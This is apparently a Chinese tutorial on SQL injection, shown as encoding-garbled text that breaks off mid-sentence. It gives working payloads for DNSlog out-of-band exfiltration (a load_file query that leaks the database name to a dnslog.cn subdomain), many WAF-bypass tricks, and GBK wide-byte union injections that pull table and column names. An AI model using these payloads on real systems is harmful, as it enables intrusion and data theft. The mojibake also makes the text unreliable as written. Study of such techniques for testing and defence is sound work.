é¦–å…ˆæˆ‘ä»¬çŸ¥é“DNSæ˜¯èµ·ipä¸åŸŸåçš„è§£æçš„æœåŠ¡ï¼Œé€šè¿‡ipå¯ä»¥è§£æåˆ°å¯¹åº”çš„åŸŸåã€‚DNSlogå°±æ˜¯å‚¨å­˜åœ¨DNSä¸Šçš„åŸŸåç›¸å…³çš„ä¿¡æ¯ï¼Œå®ƒè®°å½•ç€ä½ å¯¹åŸŸåæˆ–è€…IPçš„è®¿é—®ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯ç±»ä¼¼äºæ—¥å¿—æ–‡ä»¶ï¼Œ DNSlogå›æ˜¾åŸç† é¦–å…ˆäº†è§£ä¸€ä¸‹å¤šçº§åŸŸåçš„æ¦‚å¿µï¼Œæˆ‘ä»¬çŸ¥é“å› ç‰¹ç½‘é‡‡ç”¨æ ‘çŠ¶ç»“æ„å‘½åæ–¹æ³•ï¼ŒæŒ‰ç»„ç»‡ç»“æ„åˆ’åˆ†åŸŸæ˜¯ä¸€ä¸ªåå­—ç©ºé—´ä¸­ä¸€ä¸ªè¢«ç®¡ç†çš„åˆ’åˆ†ï¼ŒåŸŸå¯åˆ’åˆ†ä¸ºå­åŸŸï¼Œå­åŸŸå†å¯è¢«åˆ’åˆ†ä¸ºå¤šçº§åŸŸåç§°ä¸ºä¸€çº§åŸŸåï¼ŒäºŒçº§åŸŸåï¼Œä¸‰çº§åŸŸåï¼Œä»ä¸€ä¸ªåŸŸååœ°å€æ¥ä»å³åˆ°å·¦ä¾æ¬¡æ˜¯é¡¶çº§åŸŸåï¼ŒäºŒçº§åŸŸåï¼Œä¸‰çº§åŸŸå,ä¾‹å¦‚ gaobai.kxsy.com, é€šä¿—çš„è¯´å°±æ˜¯æˆ‘æœ‰ä¸ªåŸŸåkxsy.workï¼Œæˆ‘å°†åŸŸåè®¾ç½®å¯¹åº”çš„ip 2.2.2.2 ä¸Šï¼Œè¿™æ ·å½“æˆ‘å‘dnsæœåŠ¡å™¨å‘èµ·kxsy.workçš„è§£æè¯·æ±‚æ—¶ï¼ŒDNSlogä¸­ä¼šè®°å½•ä¸‹ä»–ç»™kxsy.workè§£æï¼Œè§£æå€¼ä¸º2.2.2.2ï¼Œè€Œæˆ‘ä»¬è¿™ä¸ªè§£æçš„è®°å½•çš„å€¼å°±æ˜¯æˆ‘ä»¬è¦åˆ©ç”¨çš„åœ°æ–¹,è¿™ä¸ªè¿‡ç¨‹è¢«è®°å½•ä¸‹æ¥å°±æ˜¯DNSlog, DNSlog åº”ç”¨ 1.sqlå¸ƒå°”ç›²æ³¨ã€æ—¶é—´ç›²æ³¨ï¼Œæ³¨å…¥çš„æ•ˆç‡ä½ä¸”çº¿ç¨‹é«˜å®¹æ˜“è¢«wafæ‹¦æˆªï¼Œåˆæˆ–è€…æ˜¯ç›®æ ‡ç«™ç‚¹æ²¡æœ‰å›æ˜¾å¯åˆ©ç”¨NDSlog 2.æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œ æ¨èä¸‰ä¸ªå¤§ä¼—åŒ–çš„å…è´¹dnsè§£æè®°å½•ç½‘ç«™ http://www.dnslog.cn http://admin.dnslog.link http://ceye.io DNSlogå›æ˜¾æ³¨å…¥æ¡ä»¶ 1.æ•°æ®åº“rootæƒé™ï¼Œ 2.æ•°æ®åº“å¯è¯»å†™æƒé™ï¼Œsecure_file_privå€¼ä¸ºç©ºï¼Œä¸ŠæœŸç¬”è®°æœ‰è¯´æ˜ï¼Œ 3.windowsç³»ç»Ÿï¼Œ DNSlog-sqlæ³¨å…¥ 1.æ³¨å†Œä¸€ä¸ªdnsè§£ææœåŠ¡ï¼Œåˆ©ç”¨å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œä»¥æ— å›æ˜¾sqlæ³¨å…¥ä¸ºä¾‹ 2.æ³¨å…¥æµ‹è¯• éœ€è¦é—­åˆè¯­å¥ æ›¿æ¢æ ‡è¯†ç¬¦ åˆ©ç”¨ç›²æ³¨å›æ˜¾ ?id=1' and if((select load_file(concat('\\\\\\\\',(select database()),'.tlyypi.dnslog.cn\\\\abc'))),1,0)--+ åœ¨å›æ˜¾æ•°æ®æ—¶ï¼ŒåŸŸåèƒ½å¤Ÿæ¥å—çš„å­—ç¬¦æ˜¯æœ‰æ¡ä»¶é™åˆ¶çš„ï¼ŒæŸäº›ä¸é€‚åˆä½œä¸ºåŸŸåçš„ç‰¹æ®Šå­—ç¬¦å¯èƒ½ä¼šè¢«å±è”½æ‰ï¼Œé’ˆå¯¹è¿™ç§æƒ…å†µæˆ‘ä»¬ä¹Ÿå¯ä»¥base64ç¼–ç åå†è¿›è¡Œè¯·æ±‚ã€‚ 0x05 SQLIé˜²å¾¡åŠç»•è¿‡ WAFäº§ç”Ÿçš„èƒŒæ™¯ï¼š ä¼ ç»Ÿé˜²ç«å¢™ ï¼ˆ firewall ï¼‰ é˜»æ–­æ•°æ®åŒ…ïƒ ïƒ å·¥ä½œç½‘ç»œå±‚WebæœåŠ¡å™¨åŠŸèƒ½ä¸°å¯Œæˆä¸ºæ”»å‡»ç›®æ ‡ ï¼ˆåº”ç”¨å±‚ï¼‰wafç”±æ­¤è€Œç”ŸWAFï¼ˆweb application rewallï¼‰ç§°ä¸ºwebåº”ç”¨é˜²ç«å¢™ï¼Œä»–æ˜¯é€šè¿‡æ‰§è¡Œä¸€ç³»åˆ—é’ˆå¯¹HTTPï¼ŒHTTPSçš„å®‰å…¨ç­–ç•¥ï¼Œæ¥ä¸“é—¨å¯¹webåº”ç”¨æä¾›ä¿æŠ¤çš„ä¸€æ¬¾äº§å“ã€‚WAFæ˜¯åŸºäºè§„åˆ™çš„é˜²æŠ¤ï¼Œå¯ä»¥æä¾›å„ç§webåº”ç”¨çš„å®‰å…¨è§„åˆ™ï¼Œwafç”Ÿäº§å•†å»ç»´æŠ¤è¿™ä¸ªè§„åˆ™åº“ï¼Œå¹¶å®æ—¶ä¸ºå…¶æ›´æ–°ï¼Œç”¨æˆ·æŒ‰ç…§è¿™äº›è§„åˆ™ï¼Œå¯ä»¥å¯¹åº”ç”¨è¿›è¡Œå…¨æ–¹é¢çš„ä¿æŠ¤ æ¶æ„å±‚ç»•è¿‡waf ç”¨æˆ·æœ¬èº«æ˜¯è¿›å…¥wafåè®¿é—®webé¡µé¢çš„ï¼Œåªè¦æˆ‘ä»¬æ‰¾åˆ°webçš„çœŸå®IPï¼Œç»•è¿‡wafå°±ä¸åœ¨è¯ä¸‹äº†åœ¨åŒç½‘æ®µå†…ï¼Œé¡µé¢ä¸é¡µé¢ä¹‹é—´ï¼ŒæœåŠ¡å™¨ä¸æœåŠ¡å™¨ä¹‹é—´ï¼Œé€šè¿‡wafçš„ä¿æŠ¤ï¼Œç„¶åå±•ç¤ºç»™æˆ‘ä»¬ï¼Œåªè¦æˆ‘ä»¬åœ¨å†…éƒ¨æœåŠ¡ä¹‹é—´è¿›è¡Œè®¿é—®ï¼Œå³å¯ç»•è¿‡wafè¾¹ç•Œæ¼æ´ï¼ŒåŒæ ·ç±»ä¼¼äºåŒç½‘æ®µæ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å·²çŸ¥æœåŠ¡å™¨å­˜åœ¨çš„ssrfæ¼æ´ï¼Œå°†æ•°æ®ç›´æ¥å‘é€ç»™åŒç½‘æ®µçš„web2è¿›è¡ŒSQLæ³¨å…¥ èµ„æºé™åˆ¶è§’åº¦ç»•waf ç”±äºæ•°æ®å¤ªå¤§ï¼Œä¼šå¯¼è‡´wafæ— æ³•å°†æ‰€æœ‰çš„æ•°æ®éƒ½æ£€æµ‹å®Œï¼Œè¿™ä¸ªæ—¶å€™ä¼šå¿½ç•¥æ‰æˆ‘ä»¬ä»£å…¥çš„sqlæ³¨å…¥è¯­å¥ï¼Œä»è€Œç»•è¿‡wafï¼Œå³ï¼šä½¿ç”¨POSTè¯·æ±‚ï¼Œå¯¹æœåŠ¡å™¨è¯·æ±‚å¾ˆå¤§èµ„æºæ•°æ®,é€ƒé€¸sqlæ³¨å…¥è¯­å¥ã€‚ åè®®å±‚é¢ç»•è¿‡ åŸºäºåè®®å±‚ï¼Œæœ‰çš„wafåªè¿‡æ»¤GETè¯·æ±‚ï¼Œè€Œå¯¹POSTè¯·æ±‚æ²¡åšåˆ«çš„é™åˆ¶ï¼Œå› æ­¤ï¼Œå¯ä»¥å°†GETå‹æ¢ä¸ºPOSTå‹æ–‡ä»¶æ ¼å¼ï¼Œé¡µé¢ä»…å¯¹Content-Typeä¸ºapplication/x-www-form-urlencodedæ•°æ®æ ¼å¼è¿›è¡Œè¿‡æ»¤ï¼Œå› æ­¤æˆ‘ä»¬åªè¦å°†Content-Typeæ ¼å¼ä¿®æ”¹ä¸ºmultipart/form-dataï¼Œå³å¯ç»•è¿‡wafå‚æ•°æ±¡æŸ“ï¼šæœ‰çš„wafä»…å¯¹éƒ¨åˆ†å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œä¾‹å¦‚ï¼šindex.phpï¼Ÿid=1&amp;id=2&amp;id=3è¿™æ ·çš„å‚æ•°id=1ï¼Œwafä¹Ÿä»…å¯¹å‰éƒ¨åˆ†çš„id=1è¿›è¡Œæ£€æµ‹ï¼Œè€Œåé¢çš„å‚æ•°å¹¶ä¸åšå¤„ç†ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨id=2çš„åé¢å†™å…¥sqlæ³¨å…¥è¯­å¥è¿›è¡Œsqlæ³¨å…¥ è§„åˆ™å±‚é¢ç»•waf ç­‰ä»·å‡½æ•° : hex()ã€bin() ==&gt; ascii() sleep() &gt;benchmark() concat_ws()&gt;group_concat() mid()ã€substr() ==&gt; substring() @@version ==&gt; version() ç­‰ä»·ç¬¦å· : andå’Œorä¸èƒ½ä½¿ç”¨å¯ä»¥å°è¯•ä¸‹&amp;&amp;å’Œ||ï¼Œè¿˜æœ‰=ä¸èƒ½ä½¿ç”¨çš„æƒ…å†µå¯ä»¥è€ƒè™‘å°è¯•&lt;ã€&gt;å› ä¸ºå¦‚æœä¸å°äºåˆä¸å¤§äºé‚£ä¾¿æ˜¯ç­‰äºã€‚é€»è¾‘å¼‚æˆ–xor,like(å¯ä»¥)ç‰¹æ®Šç¬¦å·:ä½¿ç”¨åå¼•å·`ï¼Œä¾‹å¦‚select `version()`ï¼Œå¯ä»¥ç”¨æ¥è¿‡ç©ºæ ¼å’Œæ­£åˆ™ï¼Œç‰¹æ®Šæƒ…å†µä¸‹è¿˜å¯ä»¥å°†å…¶åšæ³¨é‡Šç¬¦ç”¨, group by 9(å¯ä»¥) ç¼“å†²åŒºæº¢å‡ºï¼š and(select 1)=(Select 0xA*1000) uNiOn SeLeCt 1,2,version()ã€€--+ aspå…è®¸æ¯ä¸ªå­—ç¬¦å‰é¢æ·»åŠ ä¸€ä¸ª%å·SELECT FIELD FROM TABLE Ã Ã Ã  %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E 5.1 åµŒå¥—åŠå¤§å°å†™æ··æ·†ç»•è¿‡ å¦‚æœåå°å­˜åœ¨è¿™æ ·çš„è¯­å¥ $arg=str_replace('union','',$_GET['id']) //å°†unionæ›¿æ¢ä¸ºç©º æˆ–è€… $arg=preg_replace('/union/i','',$_GET['id']) //å°†unionæ›¿æ¢ä¸ºç©ºï¼Œä¸”ä¸åŒºåˆ†å¤§å°å†™ æˆ‘ä»¬å¯ä»¥è¿™æ ·æ„é€ payload ?id=1' ununionion select 1,2,3%23 //ä¸Šé¢ä¸¤ç§ç”¨æ³•å‡å¯è¿™æ ·ç»•è¿‡ str_replaceå‡½æ•°æ—¶ä¸åŒºåˆ†å¤§å°å†™çš„æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡UNionæ¥ç»•è¿‡ ?id=1' UNion select 1,2,3 --+ 5.2 ç©ºæ ¼è¢«è¿‡æ»¤çš„ç»•è¿‡ é€šè¿‡å†…å†…è”æ³¨é‡Š éƒ¨åˆ†ç¨‹åºè¿‡æ»¤äº†ç©ºæ ¼ï¼Œå°†è¾“å…¥é™åˆ¶ä¸ºå•ä¸ªï¼Œåˆ™å¯ä»¥é€šè¿‡å†…è”æ³¨é‡Šç»•è¿‡ è¿˜å¯é€šè¿‡%a0 ,%09,%0a,%0b,%0c,%0dç»•è¿‡ ?id=1' /**/union/**/order/**/by/**/2 %23 //è¿™é‡Œ/* */ä¸­é—´éƒ¨åˆ†çš„ç¬¦å·å› é¢˜è€Œå¼‚ï¼Œå¯èƒ½ä¼šæœ‰å­—ç¬¦çš„è¿‡æ»¤ï¼Œéœ€è¦ä¸€ä¸ªä¸€ä¸ªå°è¯•ï¼Œæˆ–è€…bpçˆ†ç ´ é€šè¿‡æ‹¬å·â€“emmmmmåŸºæœ¬æ²¡å•¥ç”¨ï¼Œå°±å½“ä½œSQLè¯­å¥çš„æ‹“å±•å§ï¼ˆå€’æ˜¯å¯ä»¥è·ŸæŠ¥é”™æ³¨å…¥åˆ©ç”¨ï¼Œæ¯•ç«ŸæŠ¥é”™æ³¨å…¥éœ€è¦çš„ç©ºæ ¼å°‘ï¼‰ é€šè¿‡æ‹¬å·ä»£æ›¿ç©ºæ ¼æœ‰ç‚¹é¸¡è‚‹ï¼Œå…³é”®å­—æ˜¯ä¸èƒ½è¢«æ‹¬èµ·æ¥çš„ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼Œæ¯”å¦‚order by 3ä¸èƒ½å†™ä½œ`(order)(by)(3)åŸºæœ¬æ²¡å•¥ç”¨ã€‚ 5.3 é€—å·è¢«è¿‡æ»¤çš„ç»•è¿‡ select substr(database() from 1 to 1); select mid(database() from 1 to 1); ä½œç”¨ä¹Ÿä¸å¤§ï¼Œç”¨åˆ°é€—å·çš„åœ°æ–¹å¾ˆå¤šï¼Œå¦‚è¦æŸ¥ä¸¤ä¸ªå­—æ®µunion select username,passwdè¿™é‡Œçš„é€—å·å°±ä¸èƒ½è¿™æ ·å†™ï¼Œå½“ç„¶æˆ‘ä»¬å¯ä»¥æ¯æ¬¡åªæŸ¥ä¸€ä¸ªå­—æ®µã€‚ 5.4 ç©ºå­—èŠ‚ç»•è¿‡ï¼ˆä¹Ÿå°±æ˜¯%00æˆªæ–­ï¼‰ ç”¨äºç»•è¿‡ä¸€äº›å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œå¦‚ids ipsç­‰ï¼Œè¿™äº›æ£€æµ‹ç³»ç»Ÿä¸€èˆ¬éƒ½æ˜¯ç”¨åŸç”Ÿè¯­è¨€ç¼–å†™çš„ï¼Œè€Œè¿™äº›è¯­è¨€æ£€éªŒå­—ç¬¦ä¸²çš„ç»“å°¾æ˜¯é€šè¿‡æ£€æµ‹ç©ºå­—èŠ‚ï¼Œåœ¨è¢«æ£€æµ‹ç³»ç»Ÿæ£€æµ‹çš„å­—ç¬¦å‰é¢åŠ ä¸Šä¸€ä¸ªç©ºå­—èŠ‚å°±å¯ä»¥æ¬ºéª—æ£€æµ‹ç³»ç»Ÿå¿½ç•¥è¢«æ£€æµ‹å­—ç¬¦ã€‚%00-ç©ºå­—èŠ‚ 5.5 ç¼–ç ç»•è¿‡ æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¼–ç çš„æ–¹å¼æ¬ºéª—åç«¯çš„è¿‡æ»¤æœºåˆ¶ 1. char select(char(67,58,45,56,67,45,35,44,3)); 2. 16è¿›åˆ¶ç¼–ç  0x234532e34f2a34b 3. hex 4. unhex select convert(unhex('e3f23a44b445')using utf8) 5. to_base64(),from_base64() 5.6 å¼•å·è¢«è½¬ä¹‰ èƒŒæ™¯çŸ¥è¯†: å­—ç¬¦é›† åœ¨äº†è§£å®½å­—èŠ‚æ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€çœ‹å­—ç¬¦é›†æ˜¯ä»€ä¹ˆã€‚å­—ç¬¦é›†ä¹Ÿå«å­—ç¬¦ç¼–ç ï¼Œæ˜¯ä¸€ç§å°†ç¬¦å·è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°çš„æ˜ å°„å…³ç³»ã€‚ å‡ ç§å¸¸è§çš„å­—ç¬¦é›†ï¼š ASCIIç¼–ç ï¼šå•å­—èŠ‚ç¼–ç  latin1ç¼–ç ï¼šå•å­—èŠ‚ç¼–ç  gbkç¼–ç ï¼šä½¿ç”¨ä¸€å­—èŠ‚å’ŒåŒå­—èŠ‚ç¼–ç ï¼Œ0x00-0x7FèŒƒå›´å†…æ˜¯ä¸€ä½ï¼Œå’Œ ASCII ä¿æŒä¸€è‡´ã€‚åŒå­—èŠ‚çš„ç¬¬ä¸€å­—èŠ‚èŒƒå›´æ˜¯0x81-0xFE UTF-8ç¼–ç ï¼šä½¿ç”¨ä¸€è‡³å››å­—èŠ‚ç¼–ç ï¼Œ0x00â€“0x7FèŒƒå›´å†…æ˜¯ä¸€ä½ï¼Œå’Œ ASCII ä¿æŒä¸€è‡´ã€‚å…¶å®ƒå­—ç¬¦ç”¨äºŒè‡³å››ä¸ªå­—èŠ‚å˜é•¿è¡¨ç¤ºã€‚ å®½å­—èŠ‚å°±æ˜¯ä¸¤ä¸ªä»¥ä¸Šçš„å­—èŠ‚ï¼Œå®½å­—èŠ‚æ³¨å…¥äº§ç”Ÿçš„åŸå› å°±æ˜¯å„ç§å­—ç¬¦ç¼–ç çš„ä¸å½“æ“ä½œï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡å®½å­—èŠ‚ç¼–ç ç»•è¿‡SQLæ³¨å…¥é˜²å¾¡ã€‚ GBKç¼–ç ï¼Œæ˜¯åœ¨GB2312-80æ ‡å‡†åŸºç¡€ä¸Šçš„å†…ç æ‰©å±•è§„èŒƒï¼Œä½¿ç”¨äº†åŒå­—èŠ‚ç¼–ç æ–¹æ¡ˆï¼Œå…¶ç¼–ç èŒƒå›´ä»8140è‡³FEFEï¼ˆå‰”é™¤xx7Fï¼‰ï¼Œå…±23940ä¸ªç ä½ï¼Œå…±æ”¶å½•äº†21003ä¸ªæ±‰å­—ï¼Œå®Œå…¨å…¼å®¹GB2312-80æ ‡å‡†ï¼Œæ”¯æŒå›½é™…æ ‡å‡†ISO/IEC10646-1å’Œå›½å®¶æ ‡å‡†GB13000-1ä¸­çš„å…¨éƒ¨ä¸­æ—¥éŸ©æ±‰å­—ï¼Œå¹¶åŒ…å«äº†BIG5ç¼–ç ä¸­çš„æ‰€æœ‰æ±‰å­—â€”â€”ï¼ˆæ‘˜è‡ªç™¾åº¦ç™¾ç§‘ï¼‰ã€‚ å­—ç¬¦åæ–œçº¿â€œ\\â€ çš„ASCIIç å€¼æ˜¯5Cï¼Œå ç”¨ä¸€ä¸ªå­—èŠ‚ï¼ŒGBKç¼–ç æ–¹å¼å¯ä»¥å°†åæ–œçº¿â€œ\\â€è½¬æ¢ä¸ºä¸€ä¸ªæœåŠ¡å™¨æ•°æ®åº“ä¸è¯†åˆ«çš„æ±‰å­—ï¼Œå³åœ¨5Cå‰é¢æ‹¼æ¥ç»„åˆä¸€ä¸ªå­—ç¬¦0xdfï¼Œé‚£ä¹ˆæ•°æ®åº“å°±ä¼šå°†0xdf5cè½¬æ¢ä¸ºä¸€ä¸ªä¸è¯†åˆ«çš„æ±‰å­—ï¼Œè¿™æ ·æ•°æ®åº“å°±ä¼šå°†å…¶å¿½ç•¥æ‰ã€‚ å®½å­—èŠ‚æ³¨â¼Šæºäºç¨‹åºå‘˜è®¾ç½®MySQLè¿æ¥æ—¶é”™è¯¯é…ç½®ä¸ºï¼šset character_set_client=gbkï¼Œè¿™æ ·é…ç½®ä¼šå¼•å‘ç¼–ç è½¬æ¢ä»â½½å¯¼è‡´çš„æ³¨â¼Šæ¼æ´ã€‚ å…·ä½“åŸç†å¦‚ä¸‹ï¼š1ï¼Œæ­£å¸¸æƒ…å†µä¸‹å½“GPCå¼€å¯æˆ–ä½¿â½¤addslasheså‡½æ•°è¿‡æ»¤GETæˆ–POSTæäº¤çš„å‚æ•°æ—¶ï¼Œâ¿Šå®¢ä½¿â½¤çš„å•å¼•å·'å°±ä¼šè¢«è½¬ä¹‰ä¸º: 'ï¼›2ï¼Œä½†å¦‚æœå­˜åœ¨å®½å­—èŠ‚æ³¨â¼Šï¼Œæˆ‘ä»¬è¾“â¼Š%df%27æ—¶â¾¸å…ˆç»è¿‡ä¸Šâ¾¯æåˆ°çš„å•å¼•å·è½¬ä¹‰å˜æˆäº†%df%5c%27ï¼ˆ%5cæ˜¯åæ–œæ ï¼‰ï¼Œä¹‹ååœ¨æ•°æ®åº“æŸ¥è¯¢å‰ç”±äºä½¿â½¤äº†GBKå¤šå­—èŠ‚ç¼–ç ï¼Œå³åœ¨æ±‰å­—ç¼–ç èŒƒå›´å†…ä¸¤ä¸ªå­—èŠ‚ä¼šè¢«ç¼–ç ä¸ºâ¼€ä¸ªæ±‰å­—ã€‚ç„¶åMySQLæœåŠ¡å™¨ä¼šå¯¹æŸ¥è¯¢è¯­å¥è¿›â¾GBKç¼–ç å³%df%5cè½¬æ¢æˆäº†æ±‰å­—â€œé‹â€ï¼Œâ½½å•å¼•å·é€ƒé€¸äº†å‡ºæ¥ï¼Œä»â½½é€ æˆäº†æ³¨â¼Šæ¼æ´ã€‚ GBKç¼–ç å¯¼è‡´å®½å­—èŠ‚æ³¨â¼Š GBKç¼–ç æ˜¯æ•°æ®åº“ç¼–ç ï¼Œè·Ÿå‰å°çš„ç¼–ç â½†å…³GBKè½¬UTF-8 åŸç†å…¶å®è·Ÿå‰â¾¯â¾¥åŸç†â¾¥è¯´çš„ç¬¬2æ¡æ˜¯â¼€æ ·çš„ï¼Œæˆ‘ä»¬è¾“â¼Š%df%27æ—¶â¾¸å…ˆç»è¿‡ä¸Šâ¾¯æåˆ°çš„å•å¼•å·è½¬ä¹‰å˜æˆäº†%df%5c%27ï¼ˆ%5cæ˜¯åæ–œæ ï¼‰ï¼Œç„¶å%df%5cæ­£å¥½å±äºgbkçš„æ±‰å­—ç¼–ç èŒƒå›´ï¼Œç»è¿‡iconvè½¬æ¢åˆ°utf-8ç¼–ç è½¬æ¢åå˜æˆäº†æ±‰å­—â€œé‹â€ï¼Œä»â½½åæ‰äº†åæ–œæ ä½¿å¾—å•å¼•å·é€ƒè„±å‡ºæ¥ã€‚UTF-8è½¬GBK è¿™â¾¥æˆ‘ä»¬æ€è€ƒä¸‹â€œéŒ¦â€è¿™ä¸ªå­—ï¼Œå®ƒçš„utf-8ç¼–ç æ˜¯e98ca6ï¼Œå®ƒçš„gbkç¼–ç æ˜¯%e5%5cï¼Œâ½½ä¸Šâ¾¯æåˆ°è¿‡åæ–œæ \\æ­£å¥½ä¸º%5cã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬å°†titleè®¾ç½®ä¸ºï¼šéŒ¦â€™ï¼Œâ¾¸å…ˆç»è¿‡addlasheså‡½æ•°æˆ–GPCå¯¹å•å¼•å·è½¬ä¹‰å˜ä¸ºï¼šéŒ¦â€™ï¼Œç„¶åä¼šç»è¿‡icnovå‡½æ•°ä¼šå¯¹â€éŒ¦â€è½¬åŒ–ä¸ºgbkç¼–ç ï¼Œæœ€åå°±æ˜¯ï¼šï¼…e5ï¼…5cï¼…5cï¼…27ã€‚åæ–œæ è¢«è½¬ä¹‰äº†ï¼ˆï¼…5cï¼…5cï¼‰ï¼Œä»â½½å•å¼•å·é€ƒé€¸å‡ºæ¥å°±ä¼šå¼•å‘æ³¨â¼Šæ¼æ´ã€‚ å‡è®¾å½“å‰æ•°æ®åº“ä½¿ç”¨GBKç¼–ç é›†ï¼Œæ•°æ®åº“ä¼šå°†è¾“å…¥çš„å‚æ•°%df%5cè§£æä¸ºä¸¤ä¸ªå­—èŠ‚ï¼š â€‹ å…¶ä¸­%dfä¸ºé«˜ä½å­—èŠ‚ï¼Œç¼–ç ä½æ˜¯223ï¼›%5cä¸ºä½ä½å­—èŠ‚ï¼Œç¼–ç ä½æ˜¯92ï¼›%df%5cçš„GBKç¼–ç å–å€¼èŒƒå›´å°±æ˜¯ï¼šç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯129â€”254ï¼Œç¬¬äºŒä¸ªå­—èŠ‚æ˜¯64â€”254ï¼Œæ•°æ®åº“ä¼šæŒ‰ç…§GBKç¼–ç å°†%df%5cè§£ææˆä¸€ä¸ªæ±‰å­—ï¼Œè¿™æ ·â€œ\\â€å°±ä¼šå¤±å»åŸæ¥çš„ä½œç”¨ã€‚ åœ¨ä¸Šå›¾ä¸­ï¼Œæ•°æ®åº“å°†å‚æ•°%df%5cæŒ‰ç…§GBKç¼–ç é›†è§£ææˆä¸Šå›¾ä¸­çš„æ±‰å­—ï¼šé‹ï¼Œè¿™ç§æ–¹å¼å°±æ˜¯å®½å­—èŠ‚æ³¨å…¥ã€‚ å®½å­—èŠ‚æ³¨å…¥æœ‰å‰æï¼šè¦æ±‚ç›®æ ‡MYSQLæ•°æ®åº“çš„ç¼–ç æ–¹å¼æ˜¯GBKç¼–ç ï¼Œå¹¶ä¸”å®¢æˆ·ç«¯å¿…é¡»å’Œæ•°æ®åº“çš„ç¼–ç æ–¹å¼ä¸€è‡´ï¼Œè¿™æ ·æ‰èƒ½ä½¿ç”¨å®½å­—èŠ‚æ³¨å…¥æ–¹å¼ï¼Œå®½å­—èŠ‚æ³¨å…¥è¿‡ç¨‹å¦‚ä¸‹æ‰€ç¤ºï¼š ä¸ºäº†çªç ´è¿™ä¸ªé˜²æŠ¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®½å­—èŠ‚æ³¨å…¥çš„æ–¹å¼æ¥è¿›è¡Œçªç ´ï¼Œä½¿ç”¨ï¼š %df â€™ å½“æˆ‘ä»¬åœ¨å•å¼•å·ä¹‹å‰åŠ ä¸Š%dfçš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯è¾“å…¥%df â€™ è¿™æ ·ä¼ å…¥åˆ°æ•°æ®åº“ä¸­å°±ä¼šå˜æˆï¼š %df%5c â€™ åŸç†æ˜¯åœ¨GBKç¼–ç ä¸­ï¼Œ%dfä¸ \\ çš„è½¬ä¹‰ç¬¦%5cç»“åˆä¼šç¼–ç æˆä¸€ä¸ªæ±‰å­—ï¼Œè¿™æ ·å°±ä½¿å¾— â€™ é€ƒé€¸äº†ã€‚æ­¤å¤– %DE%5C,%E0%5Cä¹Ÿéƒ½æ˜¯å¯ä»¥çš„ã€‚ egï¼š ä¼ å…¥1â€™æ—¶ï¼Œè¿”å›ç»“æœå‡ºç°1â€™ ',æ­¤å¤„æ˜¯ä¸å­˜åœ¨sqlæ³¨å…¥æ¼æ´çš„ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªç‰¹ä¾‹ï¼Œå°±æ˜¯å½“æ•°æ®åº“ç¼–ç ä¸ºGBKæ—¶å¯ä»¥ä½¿ç”¨å®½å­—èŠ‚æ³¨å…¥ï¼Œå®½å­—èŠ‚çš„æ ¼å¼æ˜¯åœ¨åœ°å€ååŠ ä¸€ä¸ª%dfï¼Œå†åŠ å•å¼•å·ï¼Œå› ä¸ºåæ–œæ çš„ç¼–ç ä¸º%5cï¼Œè€Œå†GBKç¼–ç ä¸­%df%5cä¸ºä¸€ä¸ªç¹ä½“å­—ï¼Œæ­¤æ—¶æŸ¥è¯¢å°±ä¼šå‡ºé”™ï¼Œä¸€èˆ¬ç»“åˆUnionæ³¨å…¥ä½¿ç”¨ã€‚ 1%df' union select 1,2,3 %23æŸ¥çœ‹è¾“å‡ºä½ç½® æŸ¥è¯¢è¡¨åæ—¶ï¼Œä¸€èˆ¬ä½¿ç”¨è¯­å¥ 1%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23 æŸ¥è¯¢åˆ—åçš„æ—¶å€™ä¼šæœ‰æ‰€ä¸åŒï¼Œå› ä¸ºå¯¹å•å¼•å·è¿›è¡Œäº†è¿‡æ»¤ select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=(select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()) %23 è¿˜æœ‰ä¸€äº›ä¾‹å¦‚cookieæ³¨å…¥ï¼Œbase64æ³¨å…¥ï¼Œå’ŒXFFæ³¨å…¥ï¼Œç±»å‹ç›¸ä¼¼ï¼Œä¸ä¸€ä¸€è®²è§£äº† and â‡’ &amp;&amp; or =&gt; || &lt; &gt; = =&gt; between() ,like limit 0,1 =&gt; limit 0 offset 1 substr =&gt; substring mid left right sleep =&gt; benchmark 5.7 HTTPå‚æ•°æ±¡æŸ“ å®¢æˆ·ç«¯åœ¨è®¿é—®æœåŠ¡å™¨ç«¯æ—¶ï¼Œéœ€è¦å…ˆç»è¿‡ä¸€ä¸ªtomcatæœåŠ¡å™¨ï¼Œè¿™ä¸ªtomcatæœåŠ¡å™¨ä¸­éƒ¨ç½²çš„è¿‡æ»¤ä»£ç å……å½“äº†wafçš„åŠŸèƒ½ã€‚è¾“å…¥çš„å‚æ•°ç»è¿‡tomcatæœåŠ¡å™¨è¿‡æ»¤åï¼Œå†è¢«ä¼ å…¥åˆ°çœŸæ­£çš„æœåŠ¡ç«¯apacheæœåŠ¡å™¨ä¸Šå¤„ç†ï¼Œç„¶åé€å±‚è¿”å›åˆ°å®¢æˆ·ç«¯ã€‚ è¿™é‡Œä¼ å…¥çš„å‚æ•°åªæœ‰ä¸€ä¸ªï¼Œåä¸ºidï¼Œå½“æˆ‘ä»¬å¼ºè¡Œä¼ 